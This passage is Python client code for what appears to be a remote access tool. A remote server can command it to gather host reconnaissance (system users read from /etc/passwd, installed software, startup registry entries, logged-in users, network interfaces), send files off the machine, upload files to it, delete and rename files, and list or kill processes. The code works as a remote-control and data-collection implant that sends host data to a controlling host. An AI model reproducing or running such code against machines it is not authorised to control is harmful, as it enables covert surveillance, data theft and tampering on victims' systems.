                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'hostname': socket.gethostname(),
                'ip_address': socket.gethostbyname(socket.gethostname()),
                'mac_address': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                       for elements in range(0,8*6,8)][::-1]),
                'processor': platform.processor(),
                'ram': str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB",
                'users': self._get_system_users(),
                'running_services': self._get_running_services(),
                'installed_software': self._get_installed_software(),
                'network_interfaces': self._get_network_interfaces(),
                'startup_items': self._get_startup_items(),
                'logged_in_users': self._get_logged_in_users()
            }
            
            # Convert to JSON
            data = json.dumps(system_info).encode('utf-8')
            
            # Send size first
            self.client_socket.send(struct.pack('Q', len(data)))
            
            # Send data
            self.client_socket.sendall(data)
            
            print("[*] System information sent")
            
        except Exception as e:
            print(f"[!] Error sending system info: {e}")
            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
    
    def _get_system_users(self):
        """Get list of system users"""
        users = []
        try:
            if os.name == 'nt':  # Windows
                import win32net
                resume = 0
                while True:
                    (user_list, _, resume) = win32net.NetUserEnum(None, 0, 0, resume)
                    for user in user_list:
                        users.append({
                            'name': user['name'],
                            'comment': user.get('comment', '')
                        })
                    if resume == 0:
                        break
            else:  # Unix/Linux
                with open('/etc/passwd', 'r') as f:
                    for line in f:
                        if line.strip():
                            parts = line.split(':')
                            if len(parts) >= 7:
                                users.append({
                                    'name': parts[0],
                                    'uid': parts[2],
                                    'home': parts[5],
                                    'shell': parts[6]
                                })
        except Exception as e:
            print(f"[!] Error getting system users: {e}")
        
        return users
    
    def _get_running_services(self):
        """Get list of running services"""
        services = []
        try:
            for service in psutil.win_service_iter() if os.name == 'nt' else []:
                try:
                    service_info = service.as_dict()
                    services.append({
                        'name': service_info['name'],
                        'display_name': service_info['display_name'],
                        'status': service_info['status'],
                        'start_type': service_info['start_type']
                    })
                except Exception:
                    pass
        except Exception as e:
            print(f"[!] Error getting running services: {e}")
        
        return services
    
    def _get_installed_software(self, limit=100):
        """Get list of installed software"""
        software = []
        try:
            if os.name == 'nt':  # Windows
                # Look in the registry for installed programs
                reg_paths = [
                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                    r'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
                ]
                
                for reg_path in reg_paths:
                    try:
                        registry_key = OpenKey(HKEY_LOCAL_MACHINE, reg_path)
                        for i in range(QueryInfoKey(registry_key)[0]):
                            try:
                                subkey_name = EnumKey(registry_key, i)
                                subkey = OpenKey(registry_key, subkey_name)
                                try:
                                    software_name = QueryValueEx(subkey, "DisplayName")[0]
                                    try:
                                        version = QueryValueEx(subkey, "DisplayVersion")[0]
                                    except:
                                        version = "Unknown"
                                    try:
                                        publisher = QueryValueEx(subkey, "Publisher")[0]
                                    except:
                                        publisher = "Unknown"
                                    try:
                                        install_date = QueryValueEx(subkey, "InstallDate")[0]
                                    except:
                                        install_date = "Unknown"
                                        
                                    software.append({
                                        'name': software_name,
                                        'version': version,
                                        'publisher': publisher,
                                        'install_date': install_date
                                    })
                                except:
                                    pass
                                finally:
                                    CloseKey(subkey)
                            except:
                                continue
                        CloseKey(registry_key)
                    except:
                        continue
                    
                    # Limit the number of results
                    if len(software) >= limit:
                        software = software[:limit]
                        break
                
        except Exception as e:
            print(f"[!] Error getting installed software: {e}")
        
        return software
    
    def _get_network_interfaces(self):
        """Get information about network interfaces"""
        interfaces = []
        try:
            # Get network interfaces using psutil
            for interface_name, interface_addresses in psutil.net_if_addrs().items():
                for address in interface_addresses:
                    if address.family == socket.AF_INET:  # IPv4
                        interfaces.append({
                            'interface': interface_name,
                            'ip': address.address,
                            'netmask': address.netmask,
                            'broadcast': getattr(address, 'broadcast', None)
                        })
                    elif address.family == socket.AF_INET6:  # IPv6
                        interfaces.append({
                            'interface': interface_name,
                            'ip': address.address,
                            'netmask': address.netmask,
                            'broadcast': None
                        })
        except Exception as e:
            print(f"[!] Error getting network interfaces: {e}")
        
        return interfaces
    
    def _get_startup_items(self):
        """Get items that run at startup"""
        startup_items = []
        try:
            if os.name == 'nt':  # Windows
                # Check Run keys in registry
                run_keys = [
                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
                    r'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run',
                    r'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
                ]
                
                # Check both HKLM and HKCU
                for root_key, key_name in [(HKEY_LOCAL_MACHINE, "HKLM"), (HKEY_CURRENT_USER, "HKCU")]:
                    for run_key in run_keys:
                        try:
                            registry_key = OpenKey(root_key, run_key)
                            for i in range(QueryInfoKey(registry_key)[1]):
                                try:
                                    name, value, _ = EnumValue(registry_key, i)
                                    startup_items.append({
                                        'source': f"{key_name}\\{run_key}",
                                        'name': name,
                                        'command': value
                                    })
                                except:
                                    continue
                            CloseKey(registry_key)
                        except:
                            continue
                
                # Check Startup folders
                startup_folders = [
                    os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                    os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                ]
                
                for folder in startup_folders:
                    if os.path.exists(folder):
                        for item in os.listdir(folder):
                            item_path = os.path.join(folder, item)
                            startup_items.append({
                                'source': folder,
                                'name': item,
                                'command': item_path
                            })
                
        except Exception as e:
            print(f"[!] Error getting startup items: {e}")
        
        return startup_items
    
    def _get_logged_in_users(self):
        """Get currently logged in users"""
        users = []
        try:
            for user in psutil.users():
                users.append({
                    'name': user.name,
                    'terminal': user.terminal,
                    'host': getattr(user, 'host', ''),
                    'started': datetime.fromtimestamp(user.started).strftime('%Y-%m-%d %H:%M:%S')
                })
        except Exception as e:
            print(f"[!] Error getting logged in users: {e}")
        
        return users


class ClientFileHandler:
    """Handler for file transfer operations on the client side with enhanced features"""
    
    def __init__(self, client_socket, buffer_size=4096):
        self.client_socket = client_socket
        self.buffer_size = buffer_size
        self.current_transfer = None
        self.stop_transfer = False
        self.transfer_states = {}
        
        # Try to load saved transfer states
        self.load_transfer_states()
    
    def handle_file_command(self, command):
        """Process file-related commands from the server"""
        parts = command.split('|')
    
        if parts[0] == "FILE_UPLOAD":
            # Server wants to upload a file to this client
            if len(parts) >= 3:
                dest_path = parts[1]
                file_size = int(parts[2])
                resume_position = int(parts[3]) if len(parts) > 3 else 0
                transfer_id = parts[4] if len(parts) > 4 else None
                overwrite = parts[5].lower() == "true" if len(parts) > 5 else True
                
                self.receive_file(dest_path, file_size, resume_position, transfer_id, overwrite)
            else:
                self.client_socket.send(b"ERROR: Invalid upload command format")
                
        elif parts[0] == "FILE_DOWNLOAD":
            # Server wants to download a file from this client
            if len(parts) >= 2:
                file_path = parts[1]
                resume_position = int(parts[2]) if len(parts) > 2 else 0
                transfer_id = parts[3] if len(parts) > 3 else None
                self.send_file(file_path, resume_position, transfer_id)
            else:
                self.client_socket.send(b"ERROR: Invalid download command format")
                
        elif parts[0] == "FILE_LIST":
            # Server wants a list of files in a directory
            if len(parts) >= 2:
                directory = parts[1]
                self.list_files(directory)
            else:
                self.send_error("Invalid list command format")
        
        elif parts[0] == "MKDIR":
            # Server wants to create a directory
            if len(parts) >= 2:
                directory = parts[1]
                self.create_directory(directory)
            else:
                self.client_socket.send(b"ERROR: Invalid mkdir command format")
        
        elif parts[0] == "DELETE":
            # Server wants to delete a file
            if len(parts) >= 2:
                file_path = parts[1]
                self.delete_file(file_path)
            else:
                self.client_socket.send(b"ERROR: Invalid delete command format")
        
        elif parts[0] == "RENAME":
            # Server wants to rename a file
            if len(parts) >= 3:
                old_path = parts[1]
                new_path = parts[2]
                self.rename_file(old_path, new_path)
            else:
                self.client_socket.send(b"ERROR: Invalid rename command format")
        
        elif parts[0] == "RMDIR":
            # Server wants to remove a directory
            if len(parts) >= 2:
                directory = parts[1]
                self.remove_directory(directory)
            else:
                self.client_socket.send(b"ERROR: Invalid rmdir command format")
    
    def receive_file(self, dest_path, file_size, resume_position=0, transfer_id=None, overwrite=True):
        """Receive a file from the server and save it to dest_path with enhanced error handling"""
        try:
            print(f"[*] Receiving file to {dest_path}, size: {file_size}, resume from: {resume_position}")
            
            # Reset stop flag
            self.stop_transfer = False
            
            # Create directory if it doesn't exist
            dest_dir = os.path.dirname(dest_path)
            if not os.path.exists(dest_dir):
                print(f"[*] Creating directory: {dest_dir}")
                os.makedirs(dest_dir, exist_ok=True)
            
            # Check if file exists already and handle overwrite/resume
            if os.path.exists(dest_path) and resume_position == 0:
                if not overwrite:
                    print(f"[!] File exists and overwrite not permitted: {dest_path}")
                    self.client_socket.send(b"ERROR: File exists and overwrite not permitted")
                    return
                # If overwrite=True, we'll create a new file
            
            # Check if we should resume and if the file exists
            file_mode = 'ab' if resume_position > 0 and os.path.exists(dest_path) else 'wb'
            
            if resume_position > 0:
                # Verify the file size matches the expected resume position
                if os.path.exists(dest_path):
                    actual_size = os.path.getsize(dest_path)
                    if actual_size != resume_position:
                        print(f"[!] Warning: File size mismatch for resume. Expected: {resume_position}, Actual: {actual_size}")
                        # Adjust resume position to match the file size
                        resume_position = actual_size
                        # Save transfer state with corrected position
                        if transfer_id:
                            self.transfer_states[transfer_id] = {
                                'type': 'receive',
                                'path': dest_path,
                                'size': file_size,
                                'position': resume_position
                            }
                            self.save_transfer_states()
                else:
                    print(f"[!] Cannot resume: File {dest_path} does not exist")
                    file_mode = 'wb'
                    resume_position = 0
            
            print(f"[*] Opening file in mode: {file_mode}")
            
            # Clear any stale data in the socket buffer before sending READY
            try:
                self.client_socket.settimeout(0.1)
                while True:
                    stale_data = self.client_socket.recv(1024)
                    if not stale_data:
                        break
            except (socket.timeout, BlockingIOError):
                pass  # No data to read, which is expected
            finally:
                self.client_socket.settimeout(None)
            
            # Send ready signal - EXACTLY "READY" nothing else
            self.client_socket.send(b"READY")
            print(f"[*] Sent READY signal, waiting for data...")
            
            # Record current transfer details for potential resume
            self.current_transfer = {
                'id': transfer_id,
                'type': 'receive',
                'path': dest_path,
                'size': file_size,
                'position': resume_position,
                'start_time': time.time()
            }
            
            # Save transfer state at the beginning
            if transfer_id:
                self.transfer_states[transfer_id] = {
                    'type': 'receive',
                    'path': dest_path,
                    'size': file_size,
                    'position': resume_position
                }
                self.save_transfer_states()
            
            # Receive file data
            with open(dest_path, file_mode) as f:
                if resume_position > 0:
                    print(f"[*] Seeking to position: {resume_position}")
                    f.seek(resume_position)
                    
                bytes_received = resume_position
                
                print(f"[*] Starting to receive data from position: {bytes_received}")
                last_update_time = time.time()
                start_time = time.time()  # Added start_time for accurate speed calculation
                transfer_speed = 0
                
                while bytes_received < file_size and not self.stop_transfer:
                    # Calculate how many bytes to receive in this chunk
                    remaining = min(self.buffer_size, file_size - bytes_received)
                    
                    try:
                        # Set a timeout for the receive operation
                        self.client_socket.settimeout(30)  # 30 second timeout
                        chunk = self.client_socket.recv(remaining)
                        
                        # Reset timeout after successful receive
                        self.client_socket.settimeout(None)
                    except socket.timeout:
                        print(f"[!] Timeout while receiving data")
                        # Save transfer state for potential resume
                        if transfer_id:
                            self.transfer_states[transfer_id]['position'] = bytes_received
                            self.save_transfer_states()
                        raise Exception("Connection timeout")
                    
                    if not chunk:
                        print(f"[!] No data received, connection may be closed")
                        # Save transfer state for potential resume
                        if transfer_id:
                            self.transfer_states[transfer_id]['position'] = bytes_received
                            self.save_transfer_states()
                        break
                        
                    if chunk == b"CANCEL":
                        print(f"[!] Transfer cancelled by server")
                        if transfer_id:
                            self.transfer_states[transfer_id]['position'] = bytes_received
                            self.save_transfer_states()
                        self.client_socket.send(b"CANCELLED")
                        return
                    
                    chunk_size = len(chunk)
                    
                    try:
                        f.write(chunk)
                        bytes_received += chunk_size
                        
                        # Update transfer state periodically
                        current_time = time.time()
                        if current_time - last_update_time > 2:  # Update every 2 seconds
                            elapsed_time = current_time - start_time  # Fixed: use start_time for overall speed
                            transfer_speed = bytes_received / elapsed_time if elapsed_time > 0 else 0
                            
                            print(f"[*] Progress: {bytes_received}/{file_size} bytes ({(bytes_received/file_size)*100:.1f}%)")
                            print(f"[*] Transfer speed: {self.format_size(transfer_speed)}/s")
                            
                            if transfer_id:
                                self.transfer_states[transfer_id]['position'] = bytes_received
                                self.save_transfer_states()
                                
                            last_update_time = current_time
                            
                        # Update current transfer position
                        if self.current_transfer:
                            self.current_transfer['position'] = bytes_received
                            
                    except Exception as write_error:
                        print(f"[!] Error writing to file: {write_error}")
                        # Save transfer state for potential resume
                        if transfer_id:
                            self.transfer_states[transfer_id]['position'] = bytes_received
                            self.save_transfer_states()
                        raise
                    
                    # Send acknowledgment - EXACTLY "ACK" nothing else
                    try:
                        self.client_socket.send(b"ACK")
                    except Exception as ack_error:
                        print(f"[!] Error sending ACK: {ack_error}")
                        # Save transfer state for potential resume
                        if transfer_id:
                            self.transfer_states[transfer_id]['position'] = bytes_received
                            self.save_transfer_states()
                        raise
            
            print(f"[*] File reception complete: {bytes_received}/{file_size} bytes")
            
            # Remove completed transfer from states
            if transfer_id and transfer_id in self.transfer_states and bytes_received >= file_size:
                del self.transfer_states[transfer_id]
                self.save_transfer_states()
            
            # Send success message - EXACTLY "SUCCESS" nothing else
            self.client_socket.send(b"SUCCESS")
            print(f"[*] Sent SUCCESS signal")
            
        except Exception as e:
            print(f"[!] Error receiving file: {e}")
            # Try to send error message
            try:
                error_msg = f"ERROR: {str(e)}"
                print(f"[!] Sending error: {error_msg}")
                self.client_socket.send(error_msg.encode())
            except Exception as e2:
                print(f"[!] Failed to send error message: {e2}")
        finally:
            # Ensure timeout is reset
            try:
                self.client_socket.settimeout(None)
            except:
                pass
            
            # Clear current transfer
            self.current_transfer = None

    def send_file(self, file_path, resume_position=0, transfer_id=None):
        """Send a file to the server with enhanced error handling and resume support"""
        try:
            print(f"[*] Sending file: {file_path}, resume from: {resume_position}")
            
            # Reset stop flag
            self.stop_transfer = False
            
            if not os.path.isfile(file_path):
                error_msg = f"File not found: {file_path}"
                print(f"[!] {error_msg}")
                self.client_socket.send(b"ERROR")
                self.client_socket.send(error_msg.encode())
                return
            
            # Get file size
            file_size = os.path.getsize(file_path)
            
            # Clear any stale data in the socket buffer before sending size
            try:
                self.client_socket.settimeout(0.1)
                while True:
                    stale_data = self.client_socket.recv(1024)
                    if not stale_data:
                        break
            except (socket.timeout, BlockingIOError):
                pass  # No data to read, which is expected
            finally:
                self.client_socket.settimeout(None)
            
            # Send file size first
            print(f"[*] Sending file size: {file_size} bytes")
            self.client_socket.send(struct.pack('Q', file_size))
            
            # Wait for ready signal with timeout
            self.client_socket.settimeout(30)
            try:
                ready = self.client_socket.recv(1024)
                print(f"[*] Received response: {ready}")
                
                if b"READY" not in ready:  # Changed to check for substring
                    print(f"[!] Received unexpected response instead of READY: {ready}")
                    return
            except socket.timeout:
                print(f"[!] Timeout waiting for READY signal")
                return
            finally:
                self.client_socket.settimeout(None)
            
            print(f"[*] Received READY signal, starting file transfer")
            
            # Record current transfer details for potential resume
            self.current_transfer = {
                'id': transfer_id,
                'type': 'send',
                'path': file_path,
                'size': file_size,
                'position': resume_position,
                'start_time': time.time()
            }
            
            # Save transfer state at the beginning
            if transfer_id:
                self.transfer_states[transfer_id] = {
                    'type': 'send',
                    'path': file_path,
                    'size': file_size,
                    'position': resume_position
                }
                self.save_transfer_states()
                print(f"[*] Saved transfer state for ID: {transfer_id}")
            
            # Send file data
            with open(file_path, 'rb') as f:
                if resume_position > 0:
                    print(f"[*] Seeking to position: {resume_position}")
                    f.seek(resume_position)
                    
                bytes_sent = resume_position
                last_update_time = time.time()
                start_time = time.time()
                
                while bytes_sent < file_size and not self.stop_transfer:
                    chunk = f.read(self.buffer_size)
                    if not chunk:
                        print(f"[!] End of file reached")
                        break
                    
                    try:
                        self.client_socket.send(chunk)
                        chunk_size = len(chunk)
                        bytes_sent += chunk_size
                        
                        # Update progress periodically
                        current_time = time.time()
                        if current_time - last_update_time > 2:  # Update every 2 seconds
                            elapsed_time = current_time - start_time
                            transfer_speed = bytes_sent / elapsed_time if elapsed_time > 0 else 0
                            
                            print(f"[*] Progress: {bytes_sent}/{file_size} bytes ({(bytes_sent/file_size)*100:.1f}%)")
                            print(f"[*] Transfer speed: {self.format_size(transfer_speed)}/s")
                            
                            # Save transfer state
                            if transfer_id:
                                self.transfer_states[transfer_id]['position'] = bytes_sent
                                self.save_transfer_states()
                                
                            last_update_time = current_time
                            
                        # Update current transfer position
                        if self.current_transfer:
                            self.current_transfer['position'] = bytes_sent
                            
                    except Exception as send_error:
                        print(f"[!] Error sending data: {send_error}")
                        # Save transfer state for potential resume
                        if transfer_id:
                            self.transfer_states[transfer_id]['position'] = bytes_sent
                            self.save_transfer_states()
                        raise
                    
                    # Wait for acknowledgment with timeout
                    try:
                        self.client_socket.settimeout(20)  # Increased to 20 seconds for larger files
                        ack = self.client_socket.recv(1024)
                        self.client_socket.settimeout(None)
                        
                        print(f"[*] Received ACK response: {ack}")  # Debug logging
                        
                        if ack == b"CANCEL":
                            print(f"[!] Transfer cancelled by server")
                            # Save transfer state for potential resume
                            if transfer_id:
                                self.transfer_states[transfer_id]['position'] = bytes_sent
                                self.save_transfer_states()
                            return
                            
                        # Modified to accept ACK as substring
                        if b"ACK" not in ack:
                            print(f"[!] Unexpected acknowledgment: {ack}")
                            # Save transfer state for potential resume
                            if transfer_id:
                                self.transfer_states[transfer_id]['position'] = bytes_sent
                                self.save_transfer_states()
                            raise Exception(f"Unexpected response from server: {ack}")
                            
                    except socket.timeout:
                        print(f"[!] Timeout waiting for acknowledgment")
                        # Save transfer state for potential resume
                        if transfer_id:
                            self.transfer_states[transfer_id]['position'] = bytes_sent
                            self.save_transfer_states()
                        raise Exception("Timeout waiting for acknowledgment")
            
            print(f"[*] File transfer complete: {bytes_sent}/{file_size} bytes")
            
            # Remove completed transfer from states
            if transfer_id and transfer_id in self.transfer_states and bytes_sent >= file_size:
                del self.transfer_states[transfer_id]
                self.save_transfer_states()
                print(f"[*] Transfer state cleared for completed transfer")
            
            # Wait for final confirmation with timeout
            try:
                self.client_socket.settimeout(20)  # Increased to 20 seconds
                final_response = self.client_socket.recv(1024)
                self.client_socket.settimeout(None)
                
                print(f"[*] Received final response: {final_response}")  # Debug logging
                
                if b"SUCCESS" in final_response:  # Modified to accept SUCCESS as substring
                    print(f"[*] Server confirmed successful transfer")
                elif b"CANCEL" in final_response:
                    print(f"[!] Transfer cancelled by server at the end")
                else:
                    print(f"[!] Unexpected final response: {final_response}")
            except socket.timeout:
                print(f"[!] Timeout waiting for final confirmation")
            
        except Exception as e:
            print(f"[!] Error sending file: {e}")
            # Try to notify the server
            try:
                error_msg = f"ERROR: {str(e)}"
                self.client_socket.send(error_msg.encode())
            except:
                pass
        finally:
            # Ensure timeout is reset
            try:
                self.client_socket.settimeout(None)
            except:
                pass
            
            # Clear current transfer
            self.current_transfer = None
    
    def list_files(self, directory):
        """List files in a directory with enhanced error handling and sorting."""
        try:
            print(f"[*] Listing directory: {directory}")
            
            if not os.path.isdir(directory):
                print(f"[!] Directory not found: {directory}")
                self.send_error(f"Directory not found: {directory}")
                return
            
            if not os.access(directory, os.R_OK):
                print(f"[!] Access denied to directory: {directory}")
                self.send_error(f"Access denied to directory: {directory}")
                return
            
            # Get list of files and folders
            file_list = []
            try:
                # First get all entries to sort them properly
                entries = []
                try:
                    entries = os.listdir(directory)
                except PermissionError:
                    print(f"[!] Permission denied when listing directory: {directory}")
                    self.send_error(f"Permission denied: {directory}")
                    return
                except OSError as os_error:
                    print(f"[!] OS error when listing directory: {os_error}")
                    self.send_error(f"OS error: {str(os_error)}")
                    return
                
                # Sort entries alphabetically, case-insensitive
                entries.sort(key=lambda x: x.lower())
                
                # Process each item
                for item in entries:
                    # Skip special entries like "." and ".."
                    if item in [".", ".."]:
                        continue
                        
                    full_path = os.path.join(directory, item)
                    
                    try:
                        # Get file info
                        stats = os.stat(full_path)
                        size = stats.st_size
                        modified = datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                        
                        # Determine item type
                        if os.path.isdir(full_path):
                            item_type = "Folder"
                            size_str = ""  # No size for folders
                        else:
                            ext = os.path.splitext(item)[1]
                            item_type = ext[1:].upper() if ext else "File"
                            size_str = self.format_size(size)
                        
                        # Add to list
                        file_list.append(f"{item}|{size_str}|{item_type}|{modified}")
                    except Exception as item_error:
                        print(f"[!] Error getting info for {item}: {item_error}")
                        # Include error entry for this item
                        file_list.append(f"{item}|Error|Error|{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                
                print(f"[*] Found {len(file_list)} items in directory")
                
            except Exception as e:
                print(f"[!] Error listing directory content: {e}")
                file_list.append(f"ERROR|{str(e)}|Error|{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Join list into a string
            file_list_str = '\n'.join(file_list)
            
            # Send size first
            data = file_list_str.encode('utf-8')
            self.client_socket.send(struct.pack('Q', len(data)))
            
            # Send actual data in chunks to handle large directories
            total_sent = 0
            data_size = len(data)
            
            while total_sent < data_size:
                chunk_size = min(self.buffer_size, data_size - total_sent)
                chunk = data[total_sent:total_sent + chunk_size]
                
                try:
                    sent = self.client_socket.send(chunk)
                    total_sent += sent
                except Exception as send_error:
                    print(f"[!] Error sending directory data: {send_error}")
                    break
            
            print(f"[*] Sent directory listing ({total_sent} bytes)")
            
        except Exception as e:
            print(f"[!] Error listing directory: {e}")
            self.send_error(f"Error listing directory: {str(e)}")
    
    def create_directory(self, directory):
        """Create a new directory on the client system"""
        try:
            print(f"[*] Creating directory: {directory}")
            
            # Check if directory already exists
            if os.path.exists(directory):
                if os.path.isdir(directory):
                    print(f"[*] Directory already exists: {directory}")
                    self.client_socket.send(b"SUCCESS: Directory already exists")
                    return
                else:
                    print(f"[!] Path exists but is not a directory: {directory}")
                    self.client_socket.send(b"ERROR: Path exists but is not a directory")
                    return
            
            # Create the directory and any parent directories
            os.makedirs(directory, exist_ok=True)
            
            print(f"[*] Created directory: {directory}")
            self.client_socket.send(b"SUCCESS: Directory created")
            
        except Exception as e:
            error_msg = f"ERROR: {str(e)}"
            print(f"[!] {error_msg}")
            self.client_socket.send(error_msg.encode())
    
    def delete_file(self, file_path):
        """Delete a file from the client system"""
        try:
            print(f"[*] Deleting file: {file_path}")
            
            if not os.path.exists(file_path):
                print(f"[!] File not found: {file_path}")
                self.client_socket.send(b"ERROR: File not found")
                return
                
            if os.path.isdir(file_path):
                print(f"[!] Path is a directory, not a file: {file_path}")
                self.client_socket.send(b"ERROR: Path is a directory, use RMDIR command")
                return
                
            # Delete the file
            os.remove(file_path)
            
            print(f"[*] Deleted file: {file_path}")
            self.client_socket.send(b"SUCCESS: File deleted")
            
        except Exception as e:
            error_msg = f"ERROR: {str(e)}"
            print(f"[!] {error_msg}")
            self.client_socket.send(error_msg.encode())
    
    def rename_file(self, old_path, new_path):
        """Rename a file or directory on the client system"""
        try:
            print(f"[*] Renaming: {old_path} to {new_path}")
            
            if not os.path.exists(old_path):
                print(f"[!] Path not found: {old_path}")
                self.client_socket.send(b"ERROR: Path not found")
                return
                
            if os.path.exists(new_path):
                print(f"[!] Destination path already exists: {new_path}")
                self.client_socket.send(b"ERROR: Destination path already exists")
                return
                
            # Rename the file/directory
            os.rename(old_path, new_path)
            
            print(f"[*] Renamed successfully")
            self.client_socket.send(b"SUCCESS: Renamed successfully")
            
        except Exception as e:
            error_msg = f"ERROR: {str(e)}"
            print(f"[!] {error_msg}")
            self.client_socket.send(error_msg.encode())
    
    def remove_directory(self, directory):
        """Remove a directory from the client system"""
        try:
            print(f"[*] Removing directory: {directory}")
            
            if not os.path.exists(directory):
                print(f"[!] Directory not found: {directory}")
                self.client_socket.send(b"ERROR: Directory not found")
                return
                
            if not os.path.isdir(directory):
                print(f"[!] Path is not a directory: {directory}")
                self.client_socket.send(b"ERROR: Path is not a directory")
                return
                
            # Check if directory is empty
            if os.listdir(directory):
                print(f"[!] Directory is not empty: {directory}")
                self.client_socket.send(b"ERROR: Directory is not empty")
                return
                
            # Remove the directory
            os.rmdir(directory)
            
            print(f"[*] Removed directory: {directory}")
            self.client_socket.send(b"SUCCESS: Directory removed")
            
        except Exception as e:
            error_msg = f"ERROR: {str(e)}"
            print(f"[!] {error_msg}")
            self.client_socket.send(error_msg.encode())
    
    def send_error(self, error_msg):
        """Send an error message back to the server"""
        try:
            print(f"[*] Sending error: {error_msg}")
            error_data = f"ERROR: {error_msg}".encode('utf-8')
            self.client_socket.send(struct.pack('Q', len(error_data)))
            self.client_socket.send(error_data)
        except Exception as e:
            print(f"[!] Failed to send error message: {e}")
    
    def format_size(self, size_bytes):
        """Convert byte size to human readable format"""
        if size_bytes < 0:
            return "0 B"
            
        units = ['B', 'KB', 'MB', 'GB', 'TB']
        i = 0
        while size_bytes >= 1024.0 and i < len(units) - 1:
            size_bytes /= 1024.0
            i += 1
            
        # Use more appropriate precision based on unit
        if i == 0:  # Bytes
            return f"{int(size_bytes)} {units[i]}"
        elif i == 1:  # KB
            return f"{size_bytes:.1f} {units[i]}"
        else:  # MB and above
            return f"{size_bytes:.2f} {units[i]}"
    
    def save_transfer_states(self):
        """Save transfer states to a file for resumable transfers"""
        try:
            with open("client_transfer_states.json", "w") as f:
                json.dump(self.transfer_states, f)
            print(f"[*] Saved {len(self.transfer_states)} transfer states")
        except Exception as e:
            print(f"[!] Error saving transfer states: {e}")
    
    def load_transfer_states(self):
        """Load transfer states from a file"""
        try:
            if os.path.exists("client_transfer_states.json"):
                with open("client_transfer_states.json", "r") as f:
                    self.transfer_states = json.load(f)
                print(f"[*] Loaded {len(self.transfer_states)} transfer states")
            else:
                self.transfer_states = {}
        except Exception as e:
            print(f"[!] Error loading transfer states: {e}")
            self.transfer_states = {}
    
    def cancel_current_transfer(self):
        """Cancel the current transfer"""
        self.stop_transfer = True
        print(f"[*] Flagged current transfer for cancellation")
    
class ClientProcessManager:
    """Handler for process-related operations on the client side"""
    
    def __init__(self, client_socket, buffer_size=4096):
        self.client_socket = client_socket
        self.buffer_size = buffer_size
    
    def handle_process_command(self, command):
        """Process process-related commands from the server"""
        # Convert bytes to string if necessary
        if isinstance(command, bytes):
            command = command.decode('utf-8')
            
        print(f"[*] Handling process command: {command}")
        
        if command == "PROCESS_LIST":
            print("[*] Sending process list to server")
            self.send_process_list()
        elif command.startswith("PROCESS_DETAILS|"):
            # Extract PID from command
            try:
                pid = int(command.split('|')[1])
                self.send_process_details(pid)
            except (IndexError, ValueError) as e:
                print(f"[!] Error parsing process details command: {e}")
                self.send_error("Invalid process details command")
        elif command.startswith("KILL_PROCESS|"):
            # Extract PID from command
            try:
                pid = int(command.split('|')[1])
                self.kill_process(pid)
            except (IndexError, ValueError) as e:
                print(f"[!] Error parsing kill process command: {e}")
                self.client_socket.send("ERROR: Invalid kill process command".encode())
    
    def send_process_list(self):
        """Send a list of all running processes to the server"""
        try:
            print("[*] Gathering process list data")
            
            # Get system-wide CPU and memory usage
            system_info = {
                'cpu_percent': psutil.cpu_percent(interval=0.5),
                'memory_percent': psutil.virtual_memory().percent,
                'memory_used': psutil.virtual_memory().used,
                'memory_total': psutil.virtual_memory().total
            }
            
            # Get process list (first pass to initialize CPU measurement)
            processes = []
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    # First call to cpu_percent for initialization
                    proc.cpu_percent(interval=None)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
            
            # Wait to get accurate CPU measurements
            time.sleep(0.5)
            
            # Now collect the actual data
            print("[*] Collecting detailed process information")
            for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'memory_info', 'num_threads', 'create_time']):
                try:
                    pinfo = proc.as_dict(attrs=['pid', 'name', 'username', 'status', 'memory_info', 'num_threads', 'create_time'])
                    
                    # Get CPU usage
                    try:
                        cpu_percent = proc.cpu_percent(interval=None)
                    except Exception as e:
                        cpu_percent = 0
                        print(f"[!] Error getting CPU percent: {e}")
                    
                    # Format data for transmission
                    process_data = {
                        'pid': pinfo['pid'],
                        'name': pinfo['name'],
                        'username': pinfo['username'] if pinfo['username'] else 'Unknown',
                        'status': pinfo['status'],
                        'cpu_percent': cpu_percent,
                        'memory': pinfo['memory_info'].rss if pinfo['memory_info'] else 0,
                        'threads': pinfo['num_threads'],
                        'create_time': datetime.fromtimestamp(pinfo['create_time']).strftime('%Y-%m-%d %H:%M:%S') if pinfo['create_time'] else 'Unknown'
                    }
                    
                    processes.append(process_data)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
                    # Skip this process
                    continue
                except Exception as e:
                    print(f"[!] Unexpected error processing process: {e}")
                    continue
            
            # Create the full response
            response = {
                'system': system_info,
                'processes': processes
            }
            
            # Convert to JSON and send
            print(f"[*] Sending data for {len(processes)} processes")
            json_data = json.dumps(response).encode('utf-8')
            
            # Debug: Print the first few characters of the JSON
            print(f"[*] JSON data starts with: {json_data[:100]}...")
            print(f"[*] Total JSON size: {len(json_data)} bytes")
            
            # Send size first
            size_header = struct.pack('Q', len(json_data))
            bytes_sent = self.client_socket.send(size_header)
            print(f"[*] Sent size header ({bytes_sent} bytes)")
            
            # Add a small delay to ensure packets are properly separated
            time.sleep(0.05)
            
            # Send the process list data in chunks
            total_sent = 0
            while total_sent < len(json_data):
                chunk = json_data[total_sent:total_sent + self.buffer_size]
                bytes_sent = self.client_socket.send(chunk)
                total_sent += bytes_sent
                
                # If no bytes were sent, we have a connection issue
                if bytes_sent == 0:
